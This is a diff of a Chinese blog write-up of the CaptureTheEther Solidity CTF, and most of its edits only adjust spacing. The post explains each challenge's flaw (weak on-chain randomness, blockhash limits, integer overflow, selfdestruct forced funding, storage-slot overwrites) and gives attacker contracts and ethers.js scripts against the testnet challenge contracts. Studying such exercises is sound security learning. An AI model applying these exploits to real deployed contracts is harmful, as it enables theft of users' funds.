@@ -3,14 +3,13 @@ title: 'CaptureTheEther讲解'
 date: '2022-07-26'
 ---
 
-
 ![image](https://images.unsplash.com/photo-1665305344188-ebd40311e926?ixlib=rb-1.2.1&ixid=MnwxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8&auto=format&fit=crop&w=2670&q=80)
 
 # CAPTURETHEETHER
 
-类似于Ethernauts, [题库网站](https://capturetheether.com/)
+类似于 Ethernauts, [题库网站](https://capturetheether.com/)
 
-1. 如何每次点击`Check`的时候, 小狐狸弹窗有红色提示, 并且gas比较离谱, 那么说明这笔tx 基本上是失败的, 即有一些问题没有解决. 
+1. 如何每次点击`Check`的时候, 小狐狸弹窗有红色提示, 并且 gas 比较离谱, 那么说明这笔 tx 基本上是失败的, 即有一些问题没有解决.
 2. **注意里面的一些合约地址, 替换成自己的**
 
 ---
@@ -21,13 +20,13 @@ date: '2022-07-26'
 
 ###### Deploy a contract
 
-这题不难, 部署一个合约, 然后Check一下, 点击两下Button即可, 完成✅
+这题不难, 部署一个合约, 然后 Check 一下, 点击两下 Button 即可, 完成 ✅
 
 ---
 
 ###### Call me
 
-这题是部署合约, 部署完之后 需要调用一下 `callme` 这个function, 这个调用直接走ropsten显示的合约地址里面的 **WriteContract** 就可以. 然后返回Check一下, 完成✅
+这题是部署合约, 部署完之后 需要调用一下 `callme` 这个 function, 这个调用直接走 ropsten 显示的合约地址里面的 **WriteContract** 就可以. 然后返回 Check 一下, 完成 ✅
 
 ---
 
@@ -41,9 +40,9 @@ function setNickname(bytes32 nickname) public {
 }
 ```
 
-由于这个合约并没有在etherscan上验证开源, 所以麻烦一点点
+由于这个合约并没有在 etherscan 上验证开源, 所以麻烦一点点
 
-我完成的方法是 ,ethers计算出需要传递的数据, 然后再用小狐狸, 打开16进制, 直接发送一笔tx. 如下是ethers计算数据的方法
+我完成的方法是 ,ethers 计算出需要传递的数据, 然后再用小狐狸, 打开 16 进制, 直接发送一笔 tx. 如下是 ethers 计算数据的方法
 
 ```javascript
 const ethers = require('ethers')
@@ -55,7 +54,7 @@ const endNeed = ifaceNeed.encodeFunctionData("setNickname", [ bytes32 ])
 console.log(endNeed)
 ```
 
-完成之后, 返回Check一下, 完成✅
+完成之后, 返回 Check 一下, 完成 ✅
 
 ---
 
@@ -65,15 +64,15 @@ console.log(endNeed)
 
 ###### Guess the number
 
-这个题的核心在于猜数, 当然, 合约里面写好了答案了, 是`answer=42`,  并且由于部署的合约已经在etherscan上验证, 所以直接去到相应的合约地址, WriteContract那里, 执行guess这个函数, 第一个ether参数那里输入1 [因为每次都需要1eth来运行这个函数] , 第二个参数那里输入42, 发起tx
+这个题的核心在于猜数, 当然, 合约里面写好了答案了, 是`answer=42`, 并且由于部署的合约已经在 etherscan 上验证, 所以直接去到相应的合约地址, WriteContract 那里, 执行 guess 这个函数, 第一个 ether 参数那里输入 1 [因为每次都需要 1eth 来运行这个函数] , 第二个参数那里输入 42, 发起 tx
 
-返回点击Check, 完成✅
+返回点击 Check, 完成 ✅
 
 ---
 
 ###### Guess the secret number
 
-这个题比上一个题要难一点点, 这里的答案是某个数字的hash值, 因此, 我们倒推一下该数字, 才能破解这个题, 当前给出的hash值是`0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365` , 倒推的时候要注意, `guess`的这个function, 传参数`unit8`类型, 因此 答案一定是限制在 [0,255]之间的一个整数, 一段代码遍历即可, 代码如下, 最后我这边算出来是`170`
+这个题比上一个题要难一点点, 这里的答案是某个数字的 hash 值, 因此, 我们倒推一下该数字, 才能破解这个题, 当前给出的 hash 值是`0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365` , 倒推的时候要注意, `guess`的这个 function, 传参数`unit8`类型, 因此 答案一定是限制在 [0,255]之间的一个整数, 一段代码遍历即可, 代码如下, 最后我这边算出来是`170`
 
 ```javascript
 const ethers = require('ethers')
@@ -85,15 +84,15 @@ for (let i = 0; i < 256; i++) {
 }
 ```
 
-返回点击Check, 完成✅
+返回点击 Check, 完成 ✅
 
 ---
 
 ###### Guess the random number
 
-难度再次升级, 这里并没有给出明显的指向答案的值, 但是有一句`answer = uint8(keccak256(block.blockhash(block.number - 1), now));`  这里的`answer`的大概计算方式是 结合了一个区块哈希 和 now这个时间戳 算出来的一个值,  只需要知道两个值就能把这个题解出来, 1) 创建合约时的 上一个区块哈希; 2) 创建合约时的时间戳. 以测试的[合约](https://ropsten.etherscan.io/address/0x41689832B8301c47A9aBB2e3bdAaa756F84C1237)为例, 创建于 `12602184` 这个块, 所以上一个块 `12602183` 的区块[哈希](https://ropsten.etherscan.io/block/12602183)很容易找到, 即 `0xf4a21d405adf9d652247a5c203e4744423df861519d3545e0ded03d19da7bd05`,  除此之外, 创建合约时的[时间戳](https://ropsten.etherscan.io/tx/0xa3f02546131de7c84304f36d3de2b8e1642f11c3fa0178913c2bc2a89edf87c6) 也很容易找到, 即`Jul-16-2022 03:51:36 AM +UTC` 这两个值都有了, 写个代码计算一下`answer`即可
+难度再次升级, 这里并没有给出明显的指向答案的值, 但是有一句`answer = uint8(keccak256(block.blockhash(block.number - 1), now));` 这里的`answer`的大概计算方式是 结合了一个区块哈希 和 now 这个时间戳 算出来的一个值, 只需要知道两个值就能把这个题解出来, 1) 创建合约时的 上一个区块哈希; 2) 创建合约时的时间戳. 以测试的[合约](https://ropsten.etherscan.io/address/0x41689832B8301c47A9aBB2e3bdAaa756F84C1237)为例, 创建于 `12602184` 这个块, 所以上一个块 `12602183` 的区块[哈希](https://ropsten.etherscan.io/block/12602183)很容易找到, 即 `0xf4a21d405adf9d652247a5c203e4744423df861519d3545e0ded03d19da7bd05`, 除此之外, 创建合约时的[时间戳](https://ropsten.etherscan.io/tx/0xa3f02546131de7c84304f36d3de2b8e1642f11c3fa0178913c2bc2a89edf87c6) 也很容易找到, 即`Jul-16-2022 03:51:36 AM +UTC` 这两个值都有了, 写个代码计算一下`answer`即可
 
-这是Javascript代码
+这是 Javascript 代码
 
 ```javascript
 var timestamp = (new Date("2022-07-16T03:51:36").valueOf()/1000).toString(16).padStart(64, "0");
@@ -103,7 +102,7 @@ const end = ethers.BigNumber.from(answerHash).mod(Math.pow(2,8)).toString()
 console.log(end)
 ```
 
-这是Solidity代码 
+这是 Solidity 代码
 
 ```solidity
 pragma solidity ^0.4.21;
@@ -122,7 +121,7 @@ contract B {
 }
 ```
 
-除此之外, 还有另外一种解题方法, 去通过拿存储值的方式, 直接拿answer这个值, 虽然他不是public的, 但是也是存储在区块链里的
+除此之外, 还有另外一种解题方法, 去通过拿存储值的方式, 直接拿 answer 这个值, 虽然他不是 public 的, 但是也是存储在区块链里的
 
 ```solidity
 const provider = new ethers.providers.JsonRpcProvider("https://ropsten.infura.io/v3/xxxxxxxxxxxxxxxx")
@@ -130,13 +129,13 @@ const end = await provider.getStorageAt("0x41689832B8301c47A9aBB2e3bdAaa756F84C1
 console.log(end)
 ```
 
-返回Check , 完成✅
+返回 Check , 完成 ✅
 
 ---
 
 ###### Guess the new number
 
-这个题更难一些, 这里的`answer`不是固定的, 每次发起 guess 这笔tx时, answer会自动计算值, 核心原理和上一题一样, 只不过 在这里, 我们没有办法确定 `now` 这个具体的值, 因此 `走一层合约, 再发起tx是不错的原则` ,部署完 `attacker` 合约之后, 调用`attack`函数的时候, 记得需要发送1ETH
+这个题更难一些, 这里的`answer`不是固定的, 每次发起 guess 这笔 tx 时, answer 会自动计算值, 核心原理和上一题一样, 只不过 在这里, 我们没有办法确定 `now` 这个具体的值, 因此 `走一层合约, 再发起tx是不错的原则` ,部署完 `attacker` 合约之后, 调用`attack`函数的时候, 记得需要发送 1ETH
 
 ```solidity
 pragma solidity ^0.4.21;
@@ -167,13 +166,13 @@ contract attacker {
 }
 ```
 
-返回Check, 完成✅
+返回 Check, 完成 ✅
 
 ---
 
 ###### Predict the future
 
-这个题的核心在于 先自己选择一个 [0,9] 之内的整数 锁进去, 然后 再来执行 settle 函数, 其中answer的值的计算方式和上面计算方式是一样的, 只不过最后 进行模10运算, `uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;` 同理, 我们这个题也选用走一层合约的方式去解决. 
+这个题的核心在于 先自己选择一个 [0,9] 之内的整数 锁进去, 然后 再来执行 settle 函数, 其中 answer 的值的计算方式和上面计算方式是一样的, 只不过最后 进行模 10 运算, `uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;` 同理, 我们这个题也选用走一层合约的方式去解决.
 
 > 注意: 这里我们需要有两个动作 ,一个是`LockInGuess` 另一个是`Guess` , 这两个动作 都需要用中间合约来完成, 即不能用我们自己的小狐狸钱包进行传参数调用,
 
@@ -240,7 +239,7 @@ contract attacker {
 }
 ```
 
-javascript调用如下
+javascript 调用如下
 
 ```javascript
 require('dotenv').config()
@@ -275,13 +274,13 @@ main()
 
 ###### Predict the block hash
 
-这个题的要求在于, `LockInGuess`这个function 在运行的时候, 需要传参数`bytes32 hash`.这串hash 则是作为了 `guess`, 的值. 
+这个题的要求在于, `LockInGuess`这个 function 在运行的时候, 需要传参数`bytes32 hash`.这串 hash 则是作为了 `guess`, 的值.
 
-同时 也会设定 `settlementBlockNumber` 等于当前区块+1,  然后去运行一下 `settle` 函数, 这里会计算一个answer, 但是这个answer 是根据 `settlementBlockNumber`来算的, 因此 当我们在运行`LockInGuess`的时候, 就会把一切需要的变量设定好. 
+同时 也会设定 `settlementBlockNumber` 等于当前区块+1, 然后去运行一下 `settle` 函数, 这里会计算一个 answer, 但是这个 answer 是根据 `settlementBlockNumber`来算的, 因此 当我们在运行`LockInGuess`的时候, 就会把一切需要的变量设定好.
 
-**核心在于 你输入的hash 需要是下个区块的 区块哈希, 即 你需要预测 未来的区块哈希, 从理论上来讲, 不可能** :apple: 
+**核心在于 你输入的 hash 需要是下个区块的 区块哈希, 即 你需要预测 未来的区块哈希, 从理论上来讲, 不可能** :apple:
 
-因此, 需要找找bug点, 这个点则是 **block.blockhash** 这个函数, 理论上来说, 是可以获得给定区块号的hash值, 但是 他只能支持最近的256个块[不包含当前区块], 对于256个区块之前的函数会返回0. 所以 解题办法是: **将 `lockInGuess` 传参数hash 是0 , 然后256个区块之后, 来调用一下settle函数即可.**, 由于合约没有验证开源, 因此ethers发送tx
+因此, 需要找找 bug 点, 这个点则是 **block.blockhash** 这个函数, 理论上来说, 是可以获得给定区块号的 hash 值, 但是 他只能支持最近的 256 个块[不包含当前区块], 对于 256 个区块之前的函数会返回 0. 所以 解题办法是: **将 `lockInGuess` 传参数 hash 是 0 , 然后 256 个区块之后, 来调用一下 settle 函数即可.**, 由于合约没有验证开源, 因此 ethers 发送 tx
 
 ```javascript
 const ethers = require('ethers')
@@ -305,7 +304,7 @@ async function main(){
 main()
 ```
 
-等256个Block之后, 来运行一下Settle函数
+等 256 个 Block 之后, 来运行一下 Settle 函数
 
 ```javascript
 const ethers = require('ethers')
@@ -328,7 +327,7 @@ async function main(){
 main()
 ```
 
-返回Check一下,  完成✅
+返回 Check 一下, 完成 ✅
 
 ---
 
@@ -338,41 +337,47 @@ main()
 
 ###### Token Sale
 
- 这个题目要求是, 我们能够把合约中的钱拿出来, 首先明确的是, 我们只能调用两个Function, 一个是`Sell`, 一个是`Buy`, 如果想要把合约中的钱 不符合规则的情况下拿出来, 那只有一种可能, 即 我们用钱买的Token, 再卖回回去, 这个过程是有利润的, 但是按照常理来说, 1ETH买一个, 1ETH卖一个, 也不存在价差. 
+这个题目要求是, 我们能够把合约中的钱拿出来, 首先明确的是, 我们只能调用两个 Function, 一个是`Sell`, 一个是`Buy`, 如果想要把合约中的钱 不符合规则的情况下拿出来, 那只有一种可能, 即 我们用钱买的 Token, 再卖回回去, 这个过程是有利润的, 但是按照常理来说, 1ETH 买一个, 1ETH 卖一个, 也不存在价差.
 
-重点则在于, **我们买的时候, 利用漏洞, 不用1ETH的价格来买, 然后再用1ETH的价格卖回去, 漏洞则是整数溢出** , **solidity中, 一般的uint类型来说, 最大的是uint256, 即我们在 buy 这个function中, 传参数的numberToken , 这个值 最大就是 $2^{256}-1$ , 同样, `msg.value` 这个值, 最大也是 $2^{256}-1 $. 因此, 我们利用这个漏洞来解这个题.**
+重点则在于, **我们买的时候, 利用漏洞, 不用 1ETH 的价格来买, 然后再用 1ETH 的价格卖回去, 漏洞则是整数溢出** , **solidity 中, 一般的 uint 类型来说, 最大的是 uint256, 即我们在 buy 这个 function 中, 传参数的 numberToken , 这个值 最大就是 $2^{256}-1$ , 同样, `msg.value` 这个值, 最大也是 $2^{256}-1 $. 因此, 我们利用这个漏洞来解这个题.**
 
-在Buy的时候, `require(msg.value == numTokens * PRICE_PER_TOKEN);	` 这句话是重点,    即我们需要找到一个合适的 `numTokens `传进去, 使得计算出来的结果是 溢出的, 代表着 我们可以拿到非常多的Token, 而只需要付出一丁点的 `msg.value ` 假设 
+在 Buy 的时候, `require(msg.value == numTokens * PRICE_PER_TOKEN); ` 这句话是重点, 即我们需要找到一个合适的 `numTokens `传进去, 使得计算出来的结果是 溢出的, 代表着 我们可以拿到非常多的 Token, 而只需要付出一丁点的 `msg.value ` 假设
+
 $$
 numTokens = x
 $$
-​    则有下式成立
+
+​ 则有下式成立
+
 $$
 x*1ETH=x*10^{18}=msg.value. \quad x_{max},   msg.value_{max}==2^{256}-1
 $$
- 我们想要msg.value 变得比较非常小, 所以 我们应该假设 msg.value 求出来的值是 $2^{256}$ ,  因为只有这样, 进行模运算之后, 才能确保msg.value是一个非常小的值, 所以 有下式
+
+我们想要 msg.value 变得比较非常小, 所以 我们应该假设 msg.value 求出来的值是 $2^{256}$ , 因为只有这样, 进行模运算之后, 才能确保 msg.value 是一个非常小的值, 所以 有下式
+
 $$
 2^{256} / 10^{18} = x
 $$
-  这时候,  算出来的$x=115792089237316195423570985008687907853269984665640564039457.584007913129639936$, 但是solidity中不会有小数的存在, 因此算出来的 $x=115792089237316195423570985008687907853269984665640564039457$ .   注意, 这个x的值, 这时候 $x*10^{18}$算出来的是小于 $2^{256}-1$的,  因为之前向下取整了, 所以这时候x应该➕1, 即$x=115792089237316195423570985008687907853269984665640564039458$. 这时候, 用$x*10^{18} $ 算出来的值 是要比 $2^{256} -1 $   大, 因此就会进行模运算, 算出来的 $msg.value=0.415992086870360064ETH$,  
 
-此时准备妥当, 进行Buy函数调用, 第一个参数写我们计算出的msg.value, 第二个参数 则是写数值x. 
+这时候, 算出来的$x=115792089237316195423570985008687907853269984665640564039457.584007913129639936$, 但是 solidity 中不会有小数的存在, 因此算出来的 $x=115792089237316195423570985008687907853269984665640564039457$ . 注意, 这个 x 的值, 这时候 $x*10^{18}$算出来的是小于 $2^{256}-1$的, 因为之前向下取整了, 所以这时候 x 应该 ➕1, 即$x=115792089237316195423570985008687907853269984665640564039458$. 这时候, 用$x*10^{18} $ 算出来的值 是要比 $2^{256} -1 $   大, 因此就会进行模运算, 算出来的 $msg.value=0.415992086870360064ETH$,
 
-Buy函数调用完毕之后, 进行Sell函数调用, 卖掉一个Token, 则从合约中取出了1ETH. 
+此时准备妥当, 进行 Buy 函数调用, 第一个参数写我们计算出的 msg.value, 第二个参数 则是写数值 x.
 
-**相当于, 我们花了 0.415992086870360064ETH 买了相当多的Token, 然后 卖掉1个, 返回1ETH**. 此时合约中还有0.4159ETH, 不用管即可. 或者再来几次, 都取出来,
+Buy 函数调用完毕之后, 进行 Sell 函数调用, 卖掉一个 Token, 则从合约中取出了 1ETH.
+
+**相当于, 我们花了 0.415992086870360064ETH 买了相当多的 Token, 然后 卖掉 1 个, 返回 1ETH**. 此时合约中还有 0.4159ETH, 不用管即可. 或者再来几次, 都取出来,
 
 ---
 
 ###### Token Whale
 
-这个题的要求是, 限定了Token的总量是1000, 但是他要求我们持有的Token总量要超过1m, **同样 上个题是上溢, 这个题的破解方法是下溢**. 
+这个题的要求是, 限定了 Token 的总量是 1000, 但是他要求我们持有的 Token 总量要超过 1m, **同样 上个题是上溢, 这个题的破解方法是下溢**.
 
-注意一点 即 `transferFrom`这个函数, 最后一行`_transfer(to,value)` 其实这个函数 起到的作用, 并不是tranferFrom, 而是Transfer. 即核心部分的逻辑并没有写对, 因此也给我们留下了破解的方法.
+注意一点 即 `transferFrom`这个函数, 最后一行`_transfer(to,value)` 其实这个函数 起到的作用, 并不是 tranferFrom, 而是 Transfer. 即核心部分的逻辑并没有写对, 因此也给我们留下了破解的方法.
 
-破解思想, 利用一个中介合约A, 先给这个合约授权2个代币的使用权, 然后合约A调用`TransferFrom`函数, 调用之后, 合约A的余额会非常非常多, 再调用合约A进行Transfer转账即可.
+破解思想, 利用一个中介合约 A, 先给这个合约授权 2 个代币的使用权, 然后合约 A 调用`TransferFrom`函数, 调用之后, 合约 A 的余额会非常非常多, 再调用合约 A 进行 Transfer 转账即可.
 
-由于合约代码开源, 所以没有用Ethers调用, 直接写好合约 remix + etherscan调用相关函数即可. 
+由于合约代码开源, 所以没有用 Ethers 调用, 直接写好合约 remix + etherscan 调用相关函数即可.
 
 ```solidity
 pragma solidity ^0.4.21;
@@ -436,19 +441,19 @@ contract attacker {
 }
 ```
 
-运行完相应函数之后, 返回Check, 完成✅
+运行完相应函数之后, 返回 Check, 完成 ✅
 
 ---
 
 ###### Retirement Fund
 
-这个题的要求是, 我们部署了一个退休基金的合约, 合约要求是 存款人10年之后才能提取这笔钱, 不然就只能取90%, 我们要做的就是, 如何在没有惩罚的前提下把这笔钱提取出来. 
+这个题的要求是, 我们部署了一个退休基金的合约, 合约要求是 存款人 10 年之后才能提取这笔钱, 不然就只能取 90%, 我们要做的就是, 如何在没有惩罚的前提下把这笔钱提取出来.
 
-**首先明确的是, 我们是不能够运行 withdraw 这个fucntion的, 因为owner不是我们的地址.** 
+**首先明确的是, 我们是不能够运行 withdraw 这个 fucntion 的, 因为 owner 不是我们的地址.**
 
-解题重点是这句话  `uint256 withdrawn = startBalance - address(this).balance;` 首先明确 withdrawn 是uint256类型, 正常来说, startBalance 和 address(this).balance, 一般是前者大于后者的过程, 而且 startBalance是不能改动的, 那么 如果 我们能让 startBalance < address(this.balance) 的情况发生, 那么 withdraw则是一个大于0的数[ uint256类型, 溢出 ], 则这个题目 可解.
+解题重点是这句话 `uint256 withdrawn = startBalance - address(this).balance;` 首先明确 withdrawn 是 uint256 类型, 正常来说, startBalance 和 address(this).balance, 一般是前者大于后者的过程, 而且 startBalance 是不能改动的, 那么 如果 我们能让 startBalance < address(this.balance) 的情况发生, 那么 withdraw 则是一个大于 0 的数[ uint256 类型, 溢出 ], 则这个题目 可解.
 
-**再来看函数, 貌似 不能向合约中直接转账, 没有fallback或者receive函数, 所以, 我们用别的方法 `selfdestruct`, 即我们用一个中间合约, 用这个合约向我们的银行地址转账, 然后 selfdestruct 掉, 这样就能使得 address(this).balance > startBalance**
+**再来看函数, 貌似 不能向合约中直接转账, 没有 fallback 或者 receive 函数, 所以, 我们用别的方法 `selfdestruct`, 即我们用一个中间合约, 用这个合约向我们的银行地址转账, 然后 selfdestruct 掉, 这样就能使得 address(this).balance > startBalance**
 
 ```solidity
 pragma solidity ^0.4.21;
@@ -462,25 +467,25 @@ contract RetirementFundAttacker {
 }
 ```
 
-新建合约的时候, 打一点钱比如 1wei, 然后调用kill函数.  再返回银行地址调用 collectPenalty 函数.
+新建合约的时候, 打一点钱比如 1wei, 然后调用 kill 函数. 再返回银行地址调用 collectPenalty 函数.
 
-最后返回check, 完成✅
+最后返回 check, 完成 ✅
 
 ---
 
 ###### Mapping
 
-这个题一看其实 挺懵的, 因为 这里并没有像之前的题目一样, 里面标明isComplete的值, 也告诉我们满足什么条件isComplete会返回True, 这个合约里的代码, 只有一个变量 isComplete, 其余的 则是一个动态数组
+这个题一看其实 挺懵的, 因为 这里并没有像之前的题目一样, 里面标明 isComplete 的值, 也告诉我们满足什么条件 isComplete 会返回 True, 这个合约里的代码, 只有一个变量 isComplete, 其余的 则是一个动态数组
 
-破解的点在于以太坊的slot 存储这里, 加入我们通过set动态数组 `map` 中的某一个值, 从而修改了 `isComplete` 这个值, 改为True, 则此题就能破解. 
+破解的点在于以太坊的 slot 存储这里, 加入我们通过 set 动态数组 `map` 中的某一个值, 从而修改了 `isComplete` 这个值, 改为 True, 则此题就能破解.
 
-这里简单介绍一下 slot的存储, 首先明白的是 `动态数组和Mapping` 并不是简单的依据其出现的位置, 比如 我们这个题目中 `isComplete` 存储的位置slot 是 0, 用`await provider.getStorageAt("0x844D8A9a3b610c578e6A3cBe3C2D4b4876D2CE81", 0)` 就能把这个值读出来, 但是如果读slot为1的值, 读来出的是 map的长度, 而map中元素存储位置的表达式为 keccak256(slot) + index . 即第一个元素, 即map[0]的存储位置是 keccak256(1) + 0, map[1]的存储位置是 keccak256(1) + 1. 那么当我们通过设置一个很大的index的时候, 就能构成上溢, 覆盖掉isComplete的值.
+这里简单介绍一下 slot 的存储, 首先明白的是 `动态数组和Mapping` 并不是简单的依据其出现的位置, 比如 我们这个题目中 `isComplete` 存储的位置 slot 是 0, 用`await provider.getStorageAt("0x844D8A9a3b610c578e6A3cBe3C2D4b4876D2CE81", 0)` 就能把这个值读出来, 但是如果读 slot 为 1 的值, 读来出的是 map 的长度, 而 map 中元素存储位置的表达式为 keccak256(slot) + index . 即第一个元素, 即 map[0]的存储位置是 keccak256(1) + 0, map[1]的存储位置是 keccak256(1) + 1. 那么当我们通过设置一个很大的 index 的时候, 就能构成上溢, 覆盖掉 isComplete 的值.
 
-> 每个在以太坊虚拟机（EVM）中运行的智能合约的状态都在链上永久地存储着。这个存储可以被认为是每个智能合约都保存着一个非常大的数组，初始化为全0。数组中的每个值都是32字节宽，并且有2^256个这样的值。智能合约可以在任何位置读取或写入数值。这就是存储接口的大小。
+> 每个在以太坊虚拟机（EVM）中运行的智能合约的状态都在链上永久地存储着。这个存储可以被认为是每个智能合约都保存着一个非常大的数组，初始化为全 0。数组中的每个值都是 32 字节宽，并且有 2^256 个这样的值。智能合约可以在任何位置读取或写入数值。这就是存储接口的大小。
 
-计算 isComplete的 存储位置: $2^{256} - keccak256(bytes32(1))$ 其中 keccak256(bytes32(1)) = 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6, 用$2^{256} $ 减去这个值 得出来的结果是 35707666377435648211887908874984608119992236509074197713628505308453184860938,  这时候 利用 `set` 函数, 将这个地方的值设置为1即可破解
+计算 isComplete 的 存储位置: $2^{256} - keccak256(bytes32(1))$ 其中 keccak256(bytes32(1)) = 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6, 用$2^{256} $ 减去这个值 得出来的结果是 35707666377435648211887908874984608119992236509074197713628505308453184860938, 这时候 利用 `set` 函数, 将这个地方的值设置为 1 即可破解
 
-相应的js代码
+相应的 js 代码
 
 ```javascript
 async function main(){
@@ -492,21 +497,21 @@ async function main(){
           `0x0000000000000000000000000000000000000000000000000000000000000001`
         )
     )
-    console.log(total.sub(mapDataBegin).toString()) 
+    console.log(total.sub(mapDataBegin).toString())
 }
 ```
 
-返回, Check, 完成✅
+返回, Check, 完成 ✅
 
 ---
 
 ###### Donation
 
-这个题考察的类似于上面的 **存储位覆盖**, 即通过改变owner, 来调用 `withdraw` 函数, 因为一般情况下, 我们无法调用 `withdraw` 函数, 因为owner不是我们的地址. 我们只能调用donate函数. 但是这个题的bug在于 在Donate函数中, 初始化Donation结构体的过程存在问题, 因为这里并没有表明是memory还是 storage, 因此默认为这是 storage, 这就代表着, 每一次运行donate函数, 都会重新创造一个donation, 覆盖掉原来的值, 并且, 并且他的slot站位, 分别是 0, 1.  因为这个结构体有两个值, 第二个是uint256类型. 
+这个题考察的类似于上面的 **存储位覆盖**, 即通过改变 owner, 来调用 `withdraw` 函数, 因为一般情况下, 我们无法调用 `withdraw` 函数, 因为 owner 不是我们的地址. 我们只能调用 donate 函数. 但是这个题的 bug 在于 在 Donate 函数中, 初始化 Donation 结构体的过程存在问题, 因为这里并没有表明是 memory 还是 storage, 因此默认为这是 storage, 这就代表着, 每一次运行 donate 函数, 都会重新创造一个 donation, 覆盖掉原来的值, 并且, 并且他的 slot 站位, 分别是 0, 1. 因为这个结构体有两个值, 第二个是 uint256 类型.
 
-目前我们没有运行函数的时候, slot=1 存储的是 owner这个地址, 但是当我们运行donate 函数之后, slot=1的位置 会变成 `etherAmount`. 基于此, 我们可以通过输入一个合适的 etherAmount  来使得owner等于我们自身的地址, 这样我们就可以运行 `withdraw`函数 . 由于合约在etherscan上没有验证开源, 所以这里用ethers调用. 
+目前我们没有运行函数的时候, slot=1 存储的是 owner 这个地址, 但是当我们运行 donate 函数之后, slot=1 的位置 会变成 `etherAmount`. 基于此, 我们可以通过输入一个合适的 etherAmount 来使得 owner 等于我们自身的地址, 这样我们就可以运行 `withdraw`函数 . 由于合约在 etherscan 上没有验证开源, 所以这里用 ethers 调用.
 
-Donate函数的调用如下: 
+Donate 函数的调用如下:
 
 ```javascript
 async function main(){
@@ -527,7 +532,7 @@ async function main(){
 }
 ```
 
-Withdraw函数的调用如下:
+Withdraw 函数的调用如下:
 
 ```javascript
 async function main(){
@@ -545,7 +550,7 @@ async function main(){
 }
 ```
 
-返回Check, 完成✅
+返回 Check, 完成 ✅
 
 ---
 
@@ -553,13 +558,13 @@ async function main(){
 
 这个题 要难不少, 算是前面溢出/覆盖的一个 高级题目.
 
-这个题大概意思是, 自己为自己写了个银行, 初始存了1ETH, 如果想单单只把初始的1ETH取出来 , 需要50年之后.
+这个题大概意思是, 自己为自己写了个银行, 初始存了 1ETH, 如果想单单只把初始的 1ETH 取出来 , 需要 50 年之后.
 
-平常还能向里面存一些钱, 或者修改某次存钱的余额, 每次存钱的时候, 都需要距离上次存钱时间过去一天以上, 才能创造新的存款记录. 最后想要取钱的话, 也需要大于在 `upsert` 中调用函数时传参数的TimeStamp才行. 
+平常还能向里面存一些钱, 或者修改某次存钱的余额, 每次存钱的时候, 都需要距离上次存钱时间过去一天以上, 才能创造新的存款记录. 最后想要取钱的话, 也需要大于在 `upsert` 中调用函数时传参数的 TimeStamp 才行.
 
-破解思路也是从 溢出/覆盖 入手,  需要知道的是, 每次新建Contribution的时候, **都会有amount以及unlockTimeStamp这两个参数** 而这两个参数 扰乱了 queue.length以及head 这两个变量, **即slot=0的位置, 存放的是 amount/queue.length,  slot=1存放的是 unlockTimeStamp/head**
+破解思路也是从 溢出/覆盖 入手, 需要知道的是, 每次新建 Contribution 的时候, **都会有 amount 以及 unlockTimeStamp 这两个参数** 而这两个参数 扰乱了 queue.length 以及 head 这两个变量, **即 slot=0 的位置, 存放的是 amount/queue.length, slot=1 存放的是 unlockTimeStamp/head**
 
- 主要功夫则在于下面这个判断的 else 这里
+主要功夫则在于下面这个判断的 else 这里
 
 ```solidity
 if (index >= head && index < queue.length) {
@@ -576,16 +581,16 @@ contribution.unlockTimestamp = timestamp;
 queue.push(contribution);
 ```
 
-Else这里会 创建新的 Contribution, 然后push 到动态数组中, 从而影响掉queue的length[amount=msg.value], 以及 head [unlockTimestamp=timestamp],  If这里只是影响 queue的length[amount]
+Else 这里会 创建新的 Contribution, 然后 push 到动态数组中, 从而影响掉 queue 的 length[amount=msg.value], 以及 head [unlockTimestamp=timestamp], If 这里只是影响 queue 的 length[amount]
 
-插个题 : 拿slot的方法
+插个题 : 拿 slot 的方法
 
 ```javascript
 // 动态数组拿slot
 const position =  ethers.BigNumber.from(ethers.utils.keccak256("0x0000000000000000000000000000000000000000000000000000000000000000")).add(ethers.BigNumber.from(0))
   console.log(position)
 
-//结构体的Position const position =  ethers.BigNumber.from(ethers.utils.keccak256("0x0000000000000000000000000000000000000000000000000000000000000000")).add(ethers.BigNumber.from(2).mul(ethers.BigNumber.from(2))) 
+//结构体的Position const position =  ethers.BigNumber.from(ethers.utils.keccak256("0x0000000000000000000000000000000000000000000000000000000000000000")).add(ethers.BigNumber.from(2).mul(ethers.BigNumber.from(2)))
 //后面的是Size
 
   const end2 = await provider.getStorageAt("0xcC48087C1b44f57Fdaa8A721b3d3D89bd913C9D5", position)
@@ -594,9 +599,9 @@ const position =  ethers.BigNumber.from(ethers.utils.keccak256("0x00000000000000
 
 解题思路 大概有两种, 这里重点说一种, 第二种在注释灰色区域中
 
-1. 发起第一笔upsert tx: $index=1, timestamp=2^{256}-24*3600, msg.value=1wei $, 这时候, head的值等于$2^{256} - 24*3600$. queue里面存了两个元素, 第一个元素的amount=1E, timestamp=now+50years, **第二个元素的amount=2WEI,** timestamp等于$2^{256} - 24 * 3600$, address(this)=1E+1WEI 
+1. 发起第一笔 upsert tx: $index=1, timestamp=2^{256}-24*3600, msg.value=1wei $, 这时候, head的值等于$2^{256} - 24*3600$. queue 里面存了两个元素, 第一个元素的 amount=1E, timestamp=now+50years, **第二个元素的 amount=2WEI,** timestamp 等于$2^{256} - 24 * 3600$, address(this)=1E+1WEI
 
-   >  做一说第二个元素的amount=2WEI, 是因为 queue.push(contribution); 多扩充了一个长度, 所以 amount变量被加了1
+   > 做一说第二个元素的 amount=2WEI, 是因为 queue.push(contribution); 多扩充了一个长度, 所以 amount 变量被加了 1
 
    ```javascript
    async function main(){
@@ -616,24 +621,24 @@ const position =  ethers.BigNumber.from(ethers.utils.keccak256("0x00000000000000
      const hash = await wallet.sendTransaction(tx)
      await hash.wait()
      console.log(hash.hash)
-   
+
      // const position =  ethers.BigNumber.from(ethers.utils.keccak256("0x0000000000000000000000000000000000000000000000000000000000000000")).add(ethers.BigNumber.from(3))
      // console.log(position)
-   
+
      // const end2 = await provider.getStorageAt("0xcC48087C1b44f57Fdaa8A721b3d3D89bd913C9D5", position)
      // console.log(end2)
    }
    ```
 
